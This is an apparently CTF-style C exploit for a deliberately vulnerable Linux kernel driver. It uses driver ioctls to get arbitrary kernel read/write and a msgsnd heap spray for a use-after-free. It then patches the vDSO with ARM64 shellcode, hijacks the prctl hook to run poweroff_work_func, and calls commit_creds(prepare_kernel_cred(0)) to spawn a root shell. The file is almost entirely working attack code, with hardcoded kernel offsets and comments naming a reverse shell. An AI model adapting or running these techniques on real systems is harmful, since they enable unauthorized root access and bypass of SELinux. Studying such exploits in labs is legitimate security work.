#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <stdio.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <linux/fb.h> 

#include <sys/prctl.h>   //prctl
#include <sys/auxv.h>    //AT_SYSINFO_EHDR
#include "vuln_driver.h"

#define BUFF_SIZE 96

typedef struct uaf_obj
{
	char uaf_first_buff[56];
	long arg;
	void (*fn)(long);
	char uaf_second_buff[12];
};

//用msgsnd构造堆喷
int use_after_free_msgsnd(int fd, size_t target, size_t arg)
{
	int new_len=BUFF_SIZE-48;
	struct {
		size_t mtype;
		char mtext[new_len];
	} msg;
	//布置堆喷数据
	memset(msg.mtext,0x42,new_len-1);
	memcpy(msg.mtext+56-48,&arg,sizeof(long));
	memcpy(msg.mtext+56-48+(sizeof(long)),&target,sizeof(long));
	msg.mtext[new_len]=0;
	msg.mtype=1; //mtype必须 大于0

	// 创建消息队列
	int msqid=msgget(IPC_PRIVATE,0644 | IPC_CREAT);
	// 构造UAF对象
	ioctl(fd, ALLOC_UAF_OBJ,NULL);
	ioctl(fd,FREE_UAF_OBJ,NULL);
	//开始堆喷
	for (int i=0;i<120;i++)
		msgsnd(msqid,&msg,sizeof(msg.mtext),0);
	//触发
	ioctl(fd,USE_UAF_OBJ,NULL);
	//ioctl(fd,TEST_USE_UAF_OBJ,NULL);
}


#define PATH "/dev/vulnerable_device"

#define PAGE_SIZE 4096 


static unsigned char array[10]={9,9,9,9,9,9,9,9,9,9};

size_t prepare_kernel_cred_addr=0xffffffc0000d2d60;
size_t commit_creds_addr=0xffffffc0000d2800;
size_t native_write_cr4_addr=0x65a30;
size_t sys_ioctl_offset=0x22bc59;
size_t fake_cr4=0x407f0;

void get_root()
{
	size_t sprepare_kernel_cred_addr=0xffffffc0000d2d60;
	size_t scommit_creds_addr=0xffffffc0000d2800;
	char* (*pkc)(int) = sprepare_kernel_cred_addr;
	void (*cc)(char*) = scommit_creds_addr;
	(*cc)((*pkc)(0));
}
struct vdso_patch {
	unsigned char *patch;
	unsigned char *copy;
	size_t size;
	void *addr;
};
static struct vdso_patch vdso_patch[2];
#define START_ADDR 0xffffffc000000000 //0xffffffff80000000
#define END_ADDR 0xffffffc00fffffff    //ffffffffffffefff

struct init_args {
	size_t size;
};
struct realloc_args{
	int grow;
	size_t size;
};
struct read_args{
	char *buff;
	size_t count;
};
struct seek_args{
	loff_t new_pos;
};
struct write_args{
	char *buff;
	size_t count;
};


int read_mem(int fd, size_t addr,char *buff,int count)
{
	struct seek_args s_args2;
	struct read_args r_args;
	int ret;

	s_args2.new_pos=addr-0x10;
	ret=ioctl(fd,ARBITRARY_RW_SEEK,&s_args2);  // seek
	r_args.buff=buff;
	r_args.count=count;
	ret=ioctl(fd,ARBITRARY_RW_READ,&r_args);   // read
	return ret;
}

int write_mem(int fd, size_t addr,char *buff,int count)
{
	struct seek_args s_args1;
	struct write_args w_args;
	int ret;

	s_args1.new_pos=addr-0x10;
	ret=ioctl(fd,ARBITRARY_RW_SEEK,&s_args1);  // seek
	w_args.buff=buff;
	w_args.count=count;
	ret=ioctl(fd,ARBITRARY_RW_WRITE,&w_args);  // write
	return ret;
}
int check_vdso_shellcode(char *shellcode)
{
	size_t addr=0;
	addr=getauxval(AT_SYSINFO_EHDR);
	printf("[+] vdso: 0x%lx\n");
	if (addr<0)
	{
		puts("[-] Cannnot get VDSO addr\n");
		return 0;
	}
	if (memmem((char *)addr,0x1000, shellcode,strlen(shellcode)))
	{
		return 1;
	}
	return 0;
}

int main()
{
int fd; 
int i; 
unsigned long *p_map;
	struct init_args i_args;
	struct realloc_args rello_args;
size_t kernel_base=0;
size_t selinux_disable_addr = 0x3607f0;   //ffffffff813607f0 T selinux_disable   - 0xffffffff81000000(vmmap) =0x3607f0
size_t prctl_hook=0xe9bcd8;             // 0xffffffff81e9bcc0+0x18=0xffffffff81e9bcd8 - 0xffffffff81000000=0xe9bcd8
size_t order_cmd=0xe4cf40;       //mov    rdi,0xffffffff81e4cf40
size_t poweroff_work_addr=0xa7590; // ffffffff810a7590 t poweroff_work_func


char shellcode[]="\xfd\x7b\xbf\xa9\xe1\x53\x9a\x92\xa1\x01\xa0\xf2\x00\x00\x80\x52\xfd\x03\x00\x91\x01\xf8\xdf\xf2\x20\x00\x3f\xd6\xe1\xff\x9a\x92\xa1\x01\xa0\xf2\x01\xf8\xdf\xf2\x20\x00\x3f\xd6\xfd\x7b\xc1\xa8\xc0\x03\x5f\xd6"; 
size_t result=0;
size_t addr=0;

//打开设备 
fd=open(PATH,O_RDWR);
if(fd < 0) 
{ 
printf("open fail\n"); 
exit(1); 
} 

// 构造任意地址读写
i_args.size=0x100;
ioctl(fd, ARBITRARY_RW_INIT, &i_args);
rello_args.grow=0;
rello_args.size=0x100+1;
ioctl(fd,ARBITRARY_RW_REALLOC,&rello_args);
puts("[+] We can read and write any memory! [+]");
char *buf=malloc(0x1000);
for (size_t addr=START_ADDR; addr<END_ADDR; addr+=0x1000)
{
	read_mem(fd,addr,buf,0x1000);
	if (!strcmp("gettimeofday",buf+0x202))
	{
		result=addr;
		printf("[+] found vdso 0x%lx\n",result);
		break;
	}
}

kernel_base=result & 0xffffffffff000000;
selinux_disable_addr+=kernel_base;
prctl_hook+=kernel_base;
order_cmd+=kernel_base;
poweroff_work_addr+=kernel_base;
printf("[+] found kernel_base: %p\n",kernel_base);
printf("[+] found prctl_hook: %p\n",prctl_hook);
printf("[+] found order_cmd: %p\n",order_cmd);
printf("[+] found selinux_disable_addr: %p\n",selinux_disable_addr);
printf("[+] found poweroff_work_addr: %p\n",poweroff_work_addr);

size_t vdso_addr=result;
size_t VDSO_SIZE=0x1000;
vdso_patch[0].patch = shellcode;
vdso_patch[0].size = sizeof(shellcode);
vdso_patch[0].addr = (unsigned char *)vdso_addr + VDSO_SIZE - sizeof(shellcode);

write_mem(fd,vdso_patch[0].addr, shellcode,sizeof(shellcode));


// 劫持prctl_hook去执行poweroff_work
memset(buf,'\x00',0x1000);
*(size_t *)buf = poweroff_work_addr;
write_mem(fd,prctl_hook, buf, 8);

//需要fork()子线程来执行reverse_shell程序
if (fork()==0){
	prctl(addr,2,addr,addr,2);
	exit(-1);
}

//if (check_vdso_shellcode(shellcode)!=0)
//{	
//}

if (getuid()==0)
{
	printf("[+] Congratulations! You get root shell !!! [+]\n");
	system("/bin/sh");
}

here: 
munmap(p_map, PAGE_SIZE); 
return 0; 

}
































